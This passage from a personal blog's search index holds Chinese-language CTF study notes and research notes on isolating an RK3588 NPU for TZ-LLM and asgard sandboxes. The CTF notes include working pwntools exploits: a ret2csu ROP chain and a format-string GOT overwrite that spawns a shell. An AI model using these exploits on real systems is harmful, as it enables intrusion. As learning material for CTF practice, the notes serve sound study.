p64(r15)</span><br><span class=\"line\">    <span class=\"comment\">#ret</span></span><br><span class=\"line\">    payload += p64(csu_part1_addr)</span><br><span class=\"line\">    <span class=\"comment\">#mov rdx rsi edi</span></span><br><span class=\"line\">    <span class=\"comment\">#call *r12</span></span><br><span class=\"line\">    <span class=\"comment\">#add rsp ,8  pop .......</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&#x27;A&#x27;</span>* <span class=\"number\">56</span></span><br><span class=\"line\">    <span class=\"comment\">#ret</span></span><br><span class=\"line\">    payload += p64(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">call</span>(<span class=\"params\">addr,arg1,arg2,arg3,ret_addr</span>):</span><br><span class=\"line\">    payload = csu(<span class=\"number\">0</span>,<span class=\"number\">1</span>,addr,arg3,arg2,arg1,ret_addr)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p>第一次利用：write 泄露地址，拿到libc基址</p>\n<p>第二次利用：read bss段写入system地址</p>\n<p>第三次利用：read bss段写入&#x2F;bin&#x2F;sh 或&#x2F;bin&#x2F;bash</p>\n<p>第四次利用：执行bss段记录的system函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">call(puts_got,puts_got,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br><span class=\"line\">puts_addr = u64(p.recv(<span class=\"number\">7</span>)[:<span class=\"number\">6</span>]+<span class=\"string\">b&#x27;\\x00\\x00&#x27;</span>)</span><br><span class=\"line\">libc_base = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">call(gets_got,bss_base+<span class=\"number\">0x100</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br><span class=\"line\"><span class=\"comment\"># sendline send matters</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">call(gets_got,bss_base+<span class=\"number\">0x200</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br><span class=\"line\">p.sendline(p64(system_addr))</span><br><span class=\"line\">call(bss_base+<span class=\"number\">0x200</span>,bss_base+<span class=\"number\">0x100</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"格式化字符串-format-string\"><a href=\"#格式化字符串-format-string\" class=\"headerlink\" title=\"格式化字符串(format string)\"></a>格式化字符串(format string)</h2><p><code>printf(&quot;%p%p&quot;)</code>遇到%会默认有后续参数，然后拿到值进行输出，并不会检查参数个数</p>\n<p>64位情况下 格式化字符串本身是rdi，第一个%会输出rsi 后续是rdx rcx r8 r9</p>\n<p>第六个%开始会输出栈上的数据</p>\n<ul>\n<li><p>%p 输出8字节的数据</p>\n</li>\n<li><p>%s 把数据作为字符串的首地址 输出此地址对应的字符串(\\0截断) 可用于泄露任意地址</p>\n</li>\n<li><p>%n 把已经输出的字节个数写入此数据对应的地址中 可用于修改任意地址</p>\n</li>\n<li><p>%k$p 输出第k个位置的数据</p>\n</li>\n<li><p>%kc 输出k bytes的字符</p>\n</li>\n</ul>\n<h3 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h3><p>找到格式化字符串本身在栈上的位置，可用<code>AAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code>查看哪个位置出现0x41 假设为k</p>\n<p><code>payload=&#39;addr&#39;+&#39;%k$s&#39;</code> 可用输出addr</p>\n<p>但由于地址为小端 且64位有8bytes地址 会被\\0截断 所以需要把地址放后面</p>\n<p><code>payload = &#39;%k+1$s&#39;+pad+&#39;addr&#39;</code> 前面凑8bytes  addr右移一位(8bytes)</p>\n<h3 id=\"修改地址\"><a href=\"#修改地址\" class=\"headerlink\" title=\"修改地址\"></a>修改地址</h3><p><code>payload = &#39;%&#123;x&#125;c%&#123;k&#125;$n&#39;+ pad + addr</code> 把addr放到第k个位置 先用<code>%&#123;x&#125;c</code>输出x个字符 然后数值x会写入地址addr中</p>\n<ul>\n<li>n 4bytes</li>\n<li>hn 2bytes</li>\n<li>hhn 1byte</li>\n</ul>\n<p>例如修改printf的got表（0x601028）中存储的地址为system地址（0x7f9940d4f3a0）</p>\n<p>可以一次写入2bytes 注意是小端</p>\n<p>0x601028 地址存入0xf3a0</p>\n<p>0x60102a 地址存入0x40d4</p>\n<p>0x60102c 地址存入0x7f99</p>\n<p>一次写1byte 会导致payload太长 可能破坏了栈</p>\n<p>一次写4byte 会导致输出的字符输太多 太慢</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">printf_got = elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%7$sAAAA&#x27;</span>.encode() + p64(printf_got)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Format String\\n&#x27;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">recv = p.recv()</span><br><span class=\"line\">printf_addr = u64(recv[:<span class=\"number\">6</span>]+<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">2</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">libc_base = printf_addr - libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sys_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">sys_addr_array = <span class=\"built_in\">bytearray</span>.fromhex(<span class=\"built_in\">hex</span>(sys_addr)[<span class=\"number\">2</span>:])</span><br><span class=\"line\">c = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>,<span class=\"number\">0</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        c[j] *= <span class=\"number\">256</span></span><br><span class=\"line\">        c[j] += sys_addr_array[-i-j*<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">k = <span class=\"number\">12</span></span><br><span class=\"line\">block = <span class=\"number\">16</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">f1 =  <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;c[<span class=\"number\">0</span>]&#125;</span>c%<span class=\"subst\">&#123;k&#125;</span>$hn&#x27;</span></span><br><span class=\"line\">pad = block-<span class=\"built_in\">len</span>(f1)</span><br><span class=\"line\">payload += f1 + <span class=\"string\">&#x27;A&#x27;</span> * pad </span><br><span class=\"line\"><span class=\"built_in\">print</span>(c[<span class=\"number\">0</span>])</span><br><span class=\"line\">acc = c[<span class=\"number\">0</span>] + pad </span><br><span class=\"line\">c[<span class=\"number\">1</span>] -= acc</span><br><span class=\"line\"><span class=\"keyword\">while</span> c[<span class=\"number\">1</span>] &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    c[<span class=\"number\">1</span>] += <span class=\"number\">2</span>**<span class=\"number\">16</span></span><br><span class=\"line\">f2 =  <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;c[<span class=\"number\">1</span>]&#125;</span>c%<span class=\"subst\">&#123;k+<span class=\"number\">1</span>&#125;</span>$hn&#x27;</span></span><br><span class=\"line\">pad = block-<span class=\"built_in\">len</span>(f2)</span><br><span class=\"line\">payload += f2 + <span class=\"string\">&#x27;A&#x27;</span> * pad </span><br><span class=\"line\"><span class=\"built_in\">print</span>(acc+c[<span class=\"number\">1</span>])</span><br><span class=\"line\">acc += c[<span class=\"number\">1</span>] + pad </span><br><span class=\"line\">c[<span class=\"number\">2</span>] -= acc</span><br><span class=\"line\"><span class=\"keyword\">while</span> c[<span class=\"number\">2</span>] &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    c[<span class=\"number\">2</span>] += <span class=\"number\">2</span>**<span class=\"number\">16</span></span><br><span class=\"line\">f3 =  <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;c[<span class=\"number\">2</span>]&#125;</span>c%<span class=\"subst\">&#123;k+<span class=\"number\">2</span>&#125;</span>$hn&#x27;</span></span><br><span class=\"line\">pad = block-<span class=\"built_in\">len</span>(f3)</span><br><span class=\"line\">payload += f3 + <span class=\"string\">&#x27;A&#x27;</span> * pad</span><br><span class=\"line\"><span class=\"built_in\">print</span>(acc+c[<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload = payload.encode()</span><br><span class=\"line\">payload += p64(printf_got)</span><br><span class=\"line\">payload += p64(printf_got+<span class=\"number\">2</span>)</span><br><span class=\"line\">payload += p64(printf_got+<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/bash&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\">&lt;/code&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><h3 id=\"ida\"><a href=\"#ida\" class=\"headerlink\" title=\"ida\"></a>ida</h3><ul>\n<li>F5 看C语言  空格 看汇编</li>\n<li>shift+F12 看字符串</li>\n<li>右键可以找到引用地址  重命名等</li>\n<li>展示的汇编是intel语法 AT&amp;T可以通过<code>objdump -d xx &gt;&gt; xx.txt</code>查看</li>\n</ul>\n<h3 id=\"pwntools\"><a href=\"#pwntools\" class=\"headerlink\" title=\"pwntools\"></a>pwntools</h3><ul>\n<li>remote 远程 process本地</li>\n<li>ELF 加载.so</li>\n<li>gdb.attach 本地调试</li>\n<li>sendline,recv,recvuntil</li>\n<li>p64,u64</li>\n</ul>\n<h3 id=\"pwngdb\"><a href=\"#pwngdb\" class=\"headerlink\" title=\"pwngdb\"></a>pwngdb</h3><ul>\n<li>run运行到断点或结束  start从第一行开始运行</li>\n<li>x 地址或$寄存器  看数据 &#x2F;g 8bytes &#x2F;s字符串</li>\n<li>info reg 看寄存器</li>\n<li>b *地址&#x2F;label 断点  c继续 si单步 n不进入函数 finish跳出函数</li>\n<li>got 看got表 vmmap看内存地址分布</li>\n</ul>\n<h3 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h3><p><code>ROPgadget --binary xxx</code></p>\n<ul>\n<li>–string</li>\n<li>grep</li>\n</ul>\n<h3 id=\"checksec\"><a href=\"#checksec\" class=\"headerlink\" title=\"checksec\"></a>checksec</h3><p><code>checksec xxx</code></p>\n<h2 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h2><ul>\n<li>recvuntil 最后加不加\\n</li>\n<li>sendline与send不同 导致重复</li>\n</ul>\n","categories":["ctf"]},{"title":"NPU","url":"/2026/01/31/virtualization/NPU/","content":"<h1 id=\"NPU\"><a href=\"#NPU\" class=\"headerlink\" title=\"NPU\"></a>NPU</h1><p>rknpu工作流程：</p>\n<ol>\n<li>dts kernel driver初始化</li>\n<li>通过固定地址MMIO访问</li>\n<li>给用户态暴露ioctl接口</li>\n</ol>\n<p>sandbox使用npu：</p>\n<p>tz-llm sandbox内有一个去掉调度的的npu driver 初始化MMIO submit的时候写MMIO 前后需要hypercall进行页表配置 保护。 由于没有stage2 访问的直接就是MMIO地址。  要用之前 先一个hypercall交一个job到队列 然后挂起，等调度到了再回来 进行配置。更合理 调度 公平</p>\n<p>asgard sanbox内有一个完全一样的npu driver 通过vfio进行直通 前后需要hypercall进行页表配置 保护。 有stage2 需要VMM的vfio进行stage2内存配置 达到直通MMIO的效果。  sandbox内外各自调度 配置 使用 通过hypercall 在EL2建立隔离。争抢</p>\n<p>在某一时刻，NPU只能提供给Host或者Guest</p>\n<p>当提供给Guest时，也就是通过MMIO正式计算job时，一定保证</p>\n<ol>\n<li>事先配置好页表 NPU可以访问sandbox 内存</li>\n<li>MMIO不可被Host访问 否则Host MMIO偷数据</li>\n<li>结束后再次配置页表 否则host下次可以通过MMIO偷sanbox内存数据</li>\n</ol>\n<p>计算任务前后进行NPU的独占、释放 是必要的</p>\n<p>tz-llm用现有的调度队列和策略  sandbox提交任务 调度的时候进行NPU切换 合理 公平</p>\n<p>asgard sandbox用前后hypercall抢占 不公平</p>\n<p>能否在发现后面没有normal job的时候 省略context switch 一直调度sandbox的？</p>\n<p>tz-llm强调data plane control plane分离 实际上就是MMIO直通+hypercall protect</p>\n<p>asgard强调NPU driver安全 实际上就是hypercall    vfio的直通是自带的</p>\n<p>为啥非得MMIO直通？ 反正用之前都要进secure visor去配置 配置前带job 配置后直接在secure visor 进行MMIO有什么问题？</p>\n<p>数据面仍然是直通的 配置好内存 NPU可以访问内存 而不是需要多一次copy到后端 控制面还是hypercall 原来也需要</p>\n<p>但是区别在于  原来acquire release可以粒度很大 中间做很多MMIO，现在需要一次性把信息都传入EL2 EL2在里面做</p>\n<p>sandbox隔离 NPU必须做的配置</p>\n<ol>\n<li>NPU的MMIO只能sandbox访问 host不行</li>\n<li>NPU的中断必须sandbox处理</li>\n<li>NPU可以访问sandbox memory</li>\n</ol>\n<p>方法一：用官方提供的集成好的</p>\n<p><a href=\"https://github.com/airockchip/rknn-llm\">https://github.com/airockchip/rknn-llm</a></p>\n<p><a href=\"https://github.com/airockchip/rknn-llm/blob/main/benchmark.md\">https://github.com/airockchip/rknn-llm/blob/main/benchmark.md</a></p>\n<p>方法二：用适配了rknpu的llama.cpp 需要自己改后端</p>\n<p><a href=\"https://github.com/marty1885/llama.cpp/tree/rknpu2-backend\">https://github.com/marty1885/llama.cpp/tree/rknpu2-backend</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cmake .. -DLLAMA_RKNPU2=ON</span><br><span class=\"line\">make -j</span><br><span class=\"line\">./bin/main .... -ngl 10</span><br></pre></td></tr></table></figure>\n\n<p>问题：编译llama.cpp没有RKNN_api.h 需要rknn的sdk</p>\n<p> git clone <a href=\"https://github.com/airockchip/rknn-llm.git\">https://github.com/airockchip/rknn-llm.git</a> </p>\n<p>有demo  sdk 和rknpu driver</p>\n<p>用demo+转换rknn模型 可以直接推理验证</p>\n<p>rknpu修改CMakeList 可以和llama.cpp一起用</p>\n<p><a href=\"https://www.cnblogs.com/sivon/p/19199226\">https://www.cnblogs.com/sivon/p/19199226</a></p>\n<p>完全按照这个教程 可以跑起来 &#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;rknpu&#x2F;load可以验证</p>\n<p>npu驱动在rknn-llm 替换kernel-5.10 并且需要改mm.h 和注释一个内容</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>使用提供的rknn</th>\n<th>自己在x86上转一个rknn</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>x86 pc上编译rkllm demo</td>\n<td>x</td>\n<td>x</td>\n</tr>\n<tr>\n<td>arm开发版上编译rkllm demo</td>\n<td>x</td>\n<td>ok</td>\n</tr>\n</tbody></table>\n<p>唯一的问题是看不见TTFT和TPS</p>\n<p>参考性能</p>\n<blockquote>\n<p>模型 参数<br>大小 dtype 性能 CPU<br>负载<br>NPU<br>负载 内存占用<br>TinyLLAMA 1.1B W8a8<br>预填充： 58.6157 token&#x2F;s<br>推理： 12.7262 token&#x2F;s 15.9% 3<em>49% 1.376G<br>Qwen 1.8B W8a8<br>预填充： 168.525 token&#x2F;s<br>推理： 10.8891 token&#x2F;s 13.7% 3</em>50% 2.72G<br>Qwen2 0.5B W8a8<br>预填充： 440.511 token&#x2F;s<br>推理： 17.4542 token&#x2F;s 17.75% 3<em>34% 1.344G<br>Phi-3 3.8B W8a8<br>预填充： 22.8119 token&#x2F;s<br>推理： 4.72983 token&#x2F;s 13.13% 3</em>62% 4.288G<br>ChatGLM3 6B W8a8<br>预填充： 48.8464 token&#x2F;s<br>推理： 3.80383 token&#x2F;s 8.3% 3<em>75% 7.04G<br>Gemma 2B W8a8<br>预填充： 112.489 token&#x2F;s<br>推理： 6.41746 token&#x2F;s 8.25% 3</em>64% 4.8G<br>InternLM2 1.8B W8a8<br>预填充： 117.099 token&#x2F;s<br>推理： 9.139 token&#x2F;s 11.87% 3*57% 2.432G</p>\n</blockquote>\n<p>rknn demo 在callback里面</p>\n<p>result-&gt;perf.prefill&#x2F;generate_tokens&#x2F;time_ms</p>\n<p>可以计算速度</p>\n<p>opis上rknn-llm&#x2F;examples&#x2F;rknn_api_demo&#x2F;deploy&#x2F;src</p>\n<p>g++ llm_demo.cpp -lrkllmrt</p>\n<p>运行时LD_LIBRARY_PATH&#x3D;..&#x2F;usr&#x2F;lib .&#x2F;a.out rknn 100 100</p>\n<h3 id=\"rknpu-driver\"><a href=\"#rknpu-driver\" class=\"headerlink\" title=\"rknpu driver\"></a>rknpu driver</h3><p><a href=\"https://zhuanlan.zhihu.com/p/1930641835128254631\">https://zhuanlan.zhihu.com/p/1930641835128254631</a></p>\n<p><a href=\"https://jas-hacks.blogspot.com/2024/02/rk3588-reverse-engineering-rknn.html\">https://jas-hacks.blogspot.com/2024/02/rk3588-reverse-engineering-rknn.html</a></p>\n<p><a href=\"https://github.com/mtx512/rk3588-npu\">https://github.com/mtx512/rk3588-npu</a></p>\n<p><a href=\"https://www.cnblogs.com/arnoldlu/p/18822133\">https://www.cnblogs.com/arnoldlu/p/18822133</a></p>\n<p>Rknn sdk提供rknn_matmul函数给两个矩阵乘法 这也是llama.cpp-rknpu的某个适配了的版本 但是有一个逆向的版本可以更方便控制内存 tz-llm基于逆向版本又实现了一个后端</p>\n<p>drivers&#x2F;rknpu 一共6000行</p>\n<h4 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h4><p>rknpu_drv.c</p>\n<p>late_initcall(rknpu_init)-&gt;platform_driver_register(&amp;rknpu_driver)-&gt;rknpu_probe</p>\n<ul>\n<li>devm_ioremap_resource</li>\n<li>rknpu_register_irq</li>\n<li>rknpu_power_on</li>\n</ul>\n<h4 id=\"job\"><a href=\"#job\" class=\"headerlink\" title=\"job\"></a>job</h4><p>CONFIG_ROCKCHIP_RKNPU_DRM_GEM 用的是DRM</p>\n<p>&#x2F;dev&#x2F;dri&#x2F;card0 &#x2F; card1可以提供ioctl</p>\n<p>rknpu_mem_create_ioctl 分配一个rknpu_obj 地址放到obj_addr(来自kzalloc) dma_addr(来自sg_dma_address)返回给用户 用户提供的size会调用rk_dma_heap_buffer_alloc 和dma_buf_fd</p>\n<p>rknpu_submit_ioctl-&gt;rknpu_submit 使用struct rknpu_submit 作为arg 这个arg由runtime.so准备 但是runtime.so不开源 只提供封装好的api</p>\n<p>rknpu_submit以后 调用rknpu_job_schedule  add job到todo_list 然后rknpu_job_next</p>\n<p>rknpu_job_next从rknpu_dev-&gt;subcore_datas[core_index]-&gt;todo_list拿到job</p>\n<p>rknpu_job_next-&gt;rknpu_job_commit 写MMIO 真正提交给硬件</p>\n<p>每次ioctl提交job 只会放到list上 然后调度一个进硬件跑</p>\n<p>rknpu_irq_handler-&gt;rknpu_job_done-&gt;rknpu_job_next 结束一个任务后 硬件中断 跑下一个任务</p>\n<h3 id=\"TZ-LLM\"><a href=\"#TZ-LLM\" class=\"headerlink\" title=\"TZ-LLM\"></a>TZ-LLM</h3><p><code> LD_LIBRARY_PATH=/data/local/tmp/rknpu/ /data/local/tmp/rknpu/ld-linux-aarch64.so.1 /data/local/tmp/rknpu/llama-cli --no-warmup -m $model_path -p &quot;$model#$len&quot; -n $n --cache $cache -s 1 -ngl 100 -t 4 --no-mmap -c 1124</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">+    cmake -DCMAKE_TOOLCHAIN_FILE=/home/vectorxj/android-ndk/build/cmake/android.toolchain.cmake\\</span><br><span class=\"line\">+  -DANDROID_ABI=arm64-v8a \\</span><br><span class=\"line\">+  -DANDROID_PLATFORM=android-27 \\</span><br><span class=\"line\">+  -DGGML_LLAMAFILE=OFF \\</span><br><span class=\"line\">+  -DLLAMA_CURL=OFF\\</span><br><span class=\"line\">+        -DCMAKE_BUILD_TYPE=Release\\</span><br><span class=\"line\">+        -DCMAKE_C_FLAGS=&quot;-march=armv8-a&quot; \\</span><br><span class=\"line\">+        -DCMAKE_CXX_FLAGS=&quot;-march=armv8-a&quot; \\</span><br><span class=\"line\">+        -DGGML_NATIVE=OFF -DGGML_OPENMP=OFF -DLLAMA_BUILD_TESTS=OFF -DLLAMA_CHCORE_API=OFF -DGGML_CHCORE=OFF -DGGML_CPU_AARCH64=OFF -B build-rknpure</span><br><span class=\"line\"> fi</span><br><span class=\"line\"></span><br><span class=\"line\"># szy @ broadband1 in ~/tz-llm-ae/scripts/kick-the-tires on git:main x [16:17:17] C:130</span><br><span class=\"line\">$ sudo ./build-llama.sh</span><br><span class=\"line\"># szy @ broadband1 in ~/tz-llm-ae/scripts/kick-the-tires on git:main x [18:03:26] </span><br><span class=\"line\">$ ls share/build-rknpure </span><br><span class=\"line\">fake  libggml.so  libllama.so  libremoting_backend.so  llama-cli</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>ggml&#x2F;src&#x2F;ggml-rknpu-re.cpp中</p>\n<p>npu_worker有一个循环 通过lock和conditional variable 从task中拿task 然后submit  (ioctl)</p>\n<p>先ioctl 从驱动拿到一个地址 这个地址就是之后submit的时候要用到的job标识</p>\n<p>mem_allocate</p>\n<ol>\n<li>DRM_IOCTL_RKNPU_MEM_CREATE 提供size 接受一个fd 分配一个dma addr 给NPU用</li>\n<li>DRM_IOCTL_RKNPU_MEM_MAP</li>\n<li>对拿到的fd调用mmap 返回mmap后的指针 mmap在driver中就是对前面create的dma addr做了一次map</li>\n</ol>\n<p>用户通过这个指针可以访问模型参数</p>\n<p>rk_cma_heap_allocate 内核需要一个struct dma_buf scatter list  源头是cma_alloc(page count)得到的struct page*</p>\n<p>matmul_kernel对象</p>\n<ol>\n<li>事先准备A B C 三个buf 准备好各种矩阵类型的 每个类型一个 rknn_mem （并行怎么办？） rknn_mem初始化的时候通过mem_allocate也就是rknpu的ioctl 初始化这块内存</li>\n<li>rknpu2_matmul_pre0-&gt;ggml_rknpu2_matmul_kernel_create 一个matmul_kernel会根据矩阵分块的情况构造npu task 每个task给出input weight 和output的rknn_mem  npu_task记录3个buf的ioctl之后的dma_addr 填入npu_task的cna_desc.feature_base_addr 一系列够造出 112个64bit的npu_regs 复制到regcmd 来自mem_allocate 最后填入tasks[0].regcmd_addr&#x3D;regcmd_dma npu_task最终提交tasks的obj_addr 这个rknpu_task是内核驱动提供的地址</li>\n<li>rknpu2_matmul_pre1-&gt;for_all_weights 填充inputs weights 根据fp16或者int8处理 内存复制 从ggml node的src-&gt;data复制到准备好的rknn_mem-&gt;ptr中 这个ptr来自ioctl之后fd的mmap 这部分内存可以提供给npu用</li>\n</ol>\n<p>推理的时候 需要的buf都是流动的 用到的内存就放在可以复用的buf上</p>\n<p>npu task等结构体动态创建 需要把内存从CPU上copy到 cpu npu 共用的mmap之后的共享内存上               </p>\n<ol>\n<li>llama.cpp 读参数到CPU 内存中 正常过程</li>\n<li>通过ioctl向NPU driver申请一部分内存 用于NPU推理  涉及到内核的dma mmap等</li>\n<li>推理过程中 copy模型参数从CPU内存到NPU内存  之后npu直接用这里的内存计算 理论上这里可以直接改地址？</li>\n<li>通过ioctl 拿到一个npu job  填入相关信息  很复杂 需要构造112个64 bit</li>\n<li>ioctl submit这个job进行推理 job本身自己有标识  内容都在这个job里面 包括推理的内存地址</li>\n</ol>\n<p>跑rk3588-npu这个仓库的check 可以发现矩阵乘法在大部分条件下都是可以正常工作 结果正确的</p>\n<p> 部分size下 会卡死npu的核 100%一直在跑然后timeout</p>\n<p>不清楚tz-llm llama-cli 为什么，seg fault</p>\n<p><a href=\"https://github.com/TZ-LLM/tee_os_kernel/blob/eurosys-ae/user/system-services/chcore-libc/libchcore/porting/overrides/src/chcore-port/rknpu-driver.c#L730\">https://github.com/TZ-LLM/tee_os_kernel/blob/eurosys-ae/user/system-services/chcore-libc/libchcore/porting/overrides/src/chcore-port/rknpu-driver.c#L730</a></p>\n<p>TZ-LLM 对tee npu对设计</p>\n<p>数据面隔离 控制面在一起</p>\n<p>REE npu driver完整</p>\n<p>TEE npu driver包含</p>\n<ul>\n<li>初始化内存 IOPT buffer register cmd</li>\n<li>MMIO 触发job</li>\n<li>处理npu中断</li>\n</ul>\n<p>NPU分为secure和non secure mode 后者没有办法访问secure memory</p>\n<p>TEE需要用NPU时 需要等待non-secure NPU job做完 然后配置TZASC TZPC GIC 修改页表 中断路由</p>\n<p>REE driver构造一个shadow job 正常调度 调度到TEE job就切换secore mode </p>\n<p>smc switch&#x2F; TZASC TZPC &#x2F; GIC配置 占用推理时间 TTFT&#x2F; decode 1.6%-5.7% 看这个job本身的计算时间</p>\n<p>用户态调用的时候 rknpu_dev_init-&gt;npu_open-&gt;rknpu_init-&gt; 注册中断 内存 都需要syscall到EL1 </p>\n<p>通过chcore api注册好内存以后 npu mmio的地址会对应到一个地址 之后npu submit的时候直接写那个地址 正常驱动是devm_ioremap_resource 也就是说TEE OS里的其实也放了一个正常的NPU driver 区别只是裁剪 降级了</p>\n<p>TEE OS并没有stage2翻译 所以这里ioremap过后 最终访问的PA 就是NPU硬件的PA 可以直接用（控制平面）</p>\n<p>对于数据平面 需要在submit前后进行相关配置 完成隔离 smc应该只是进行了特权级切换 理论上syscall也可以做到？ 因为llama.cpp已经跑在secure world了</p>\n<p>对于虚拟化场景 也是需要配置stage2内存指向MMIO区域 中断 <a href=\"https://zhuanlan.zhihu.com/p/1976395505681601946\">https://zhuanlan.zhihu.com/p/1976395505681601946</a></p>\n<p>从代码上看 tz-llm的llama.cpp仍然是用的ioctl 但是tee-os里面 放在了用户态 用户态npu_submit 全都用户态做 MMIO也可以直接用户态完成</p>\n<p>USE_CHCORE的情况下，llama.cpp应该和kernel 一起编译的？ extern调用npu_submit_multi 这是chcore用户态系统服务 rknpu driver暴露的函数 里面调用npu_enter_secure __rknpu_submit npu_exit_secure 包住的就是通过syscall配置npu的部分 </p>\n<p>smc 到tz_driver 这部分和ree kernel一起编译 调用rknpu_submit_s 这里会给ree npu driver加一个job REE NPU调度到的时候</p>\n<p>smc_resume_npu_thread  唤醒waiting_npu_thread 再次进入TEE</p>\n<p>mem_allocate直接变chcore_alloc_dma_mem了</p>\n<ol>\n<li>llama.cpp通过chcore接口进入chcore用户态系统服务</li>\n<li>chcore调用smc 进入EL3 此时记录thread context 然后调用rknpu_submit_s</li>\n<li>进入REE NPU driver 构造一个job 然后正常schedule</li>\n<li>schedule到一个 secure job的时候 smc_resume_npu_thread 唤醒之前等待的线程 再次进入TEE</li>\n<li>调页表 配置TEE独有</li>\n<li>TEE submit 直接MMIO执行</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">RKNPU_SUBMIT returned 0</span><br><span class=\"line\">=========================================================================================================</span><br><span class=\"line\">Performance Summary:</span><br><span class=\"line\">  CPU computation time: 456.715 ms (2.35 GFLOPS)</span><br><span class=\"line\">  NPU computation time: 2.869 ms (374.26 GFLOPS)</span><br><span class=\"line\">  Speedup: 159.19x</span><br><span class=\"line\">=========================================================================================================</span><br><span class=\"line\">Comparing CPU (expected) vs NPU (actual) results...</span><br><span class=\"line\">---------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">Comparison Summary:</span><br><span class=\"line\">  Total elements: 524288</span><br><span class=\"line\">  Matched: 524288 (100.00%)</span><br><span class=\"line\">  Mismatched: 0 (0.00%)</span><br><span class=\"line\">✓ Multiplication of [256,1024] x [2048,1024] successful - All results match!</span><br><span class=\"line\">=========================================================================================================</span><br><span class=\"line\">rk3588_t:/data/data/com.termux/files/home/rk3588-npu/build-android # ./matmul_int8 256 1024 2048</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>计算一次2.8ms</p>\n<h3 id=\"asgard\"><a href=\"#asgard\" class=\"headerlink\" title=\"asgard\"></a>asgard</h3><p>对于asgard 用了dts和vfio直通以后 给EL2增加了一个acquire 一个release device的接口</p>\n<p>同一时刻还是只有一个实体可以用NPU time-share也是需要切换npu状态 包括MMIO IOMMU配置 acuire release在0.01ms</p>\n<p><a href=\"https://blog.csdn.net/stray2b/article/details/124330071\">https://blog.csdn.net/stray2b/article/details/124330071</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mv /dev/vfio /dev/vfio.tmp</span><br><span class=\"line\">mkdir /dev/vfio</span><br><span class=\"line\">mv /dev/vfio.tmp /dev/vfio/vfio</span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 /sys/module/vfio_iommu_type1/parameters/allow_unsafe_interrupts</span><br><span class=\"line\">echo Y &gt; /sys/module/vfio_iommu_type1/parameters/allow_unsafe_interrupts</span><br><span class=\"line\">chmod 777 